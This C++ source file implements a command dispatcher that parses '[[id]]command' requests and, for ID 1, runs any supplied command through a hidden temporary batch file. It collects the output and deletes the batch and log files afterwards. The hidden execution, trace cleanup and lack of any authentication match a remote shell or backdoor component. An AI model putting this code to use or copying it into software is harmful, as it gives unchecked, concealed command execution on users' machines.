/*
*      Copyright 2016 Riccardo Melioli.
*/

#include "protocol.h"

std::string CommandsDispatcher(std::string request) {
    std::string response = "";
    if (request.find("[[") != std::string::npos &&
        request.find("]]") != std::string::npos) {
        // find position of delimiter inside starting string
        std::size_t posStartDelimiterComID = request.find("[[") + 2;
        std::size_t posEndDelimiterComID = request.find("]]");
        std::size_t posStartDelimiterCommand = request.find("]]") + 2;
        std::size_t posEndDelimiterCommand = request.find("\n");
        // determinate length of command and commandID
        unsigned int commandIDLength = posEndDelimiterComID - posStartDelimiterComID;
        unsigned int commandLength = posEndDelimiterCommand - posStartDelimiterCommand;
        // extract command e commandID starting string
        int commandID = atoi((request.substr(posStartDelimiterComID, commandIDLength)).c_str());
        std::string command = request.substr(posStartDelimiterCommand, commandLength);

        switch (commandID) {
            case 0:
                response = "***quit***";
                break;
            case 1:
                response = CodeExecution(command);
                break;
            case 2: //...
                break;
            default:
                response = "error: Command ID not found\n";
                break;
        }
    } else {
        response = "error: Malformed command\n";
    }
    return response;
}

std::string CodeExecution(std::string command) {
    // write the output of command in a file
    srand((unsigned int) time(0));
    std::stringstream ss;
    std::stringstream stringStream;
    ss << rand(); // An integer value between 0 and RAND_MAX

    std::string fileName = ss.str();
    char tmp_path[MAX_PATH];
    GetTempPath(MAX_PATH, tmp_path);
    std::string fileBat = tmp_path;
    fileBat.append(fileName + ".bat");
    std::string fileLog = tmp_path;
    fileLog.append(fileName + ".log");

    std::string commandTmp = command;
    commandTmp.append(" > " + fileLog);
    std::ofstream file;
    file.open(fileBat.c_str());

    if (file.is_open()) {
        for (std::string::iterator it = commandTmp.begin();
             it != commandTmp.end(); ++it) {
            file << *it;
        }
        file.close();
    } else {
        return " ERROR: cannot open file bat";
    }

    std::string response = command + "  -->  ";
    if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
        // Response
        // a pause that allow at system to create file
        int delay[] = {50, 500, 1000, 3000, 10000};
        for (int i = 0; i < 5; ++i) {
            Sleep(delay[i]);
            std::ifstream fileResp;
            fileResp.open(fileLog.c_str());
            std::string s;
            if (fileResp.is_open()) {
                stringStream << i + 1;
                response.append("Attempt " + stringStream.str() + ": Success!\n");
                stringStream.flush();
                while (!fileResp.eof()) {
                    getline(fileResp, s);
                    response.push_back('\n');
                    response.append(s);
                }
                fileResp.close();
                break;
            } else {
                stringStream << i + 1;
                response.append("Attempt " + stringStream.str() + ": could not open out file\n");
                stringStream.flush();
            }
        }
    } else {
        response = "error: executing command\n";
    }

    // remove tmp files
    remove(fileBat.c_str());
    remove(fileLog.c_str());

    return response;
}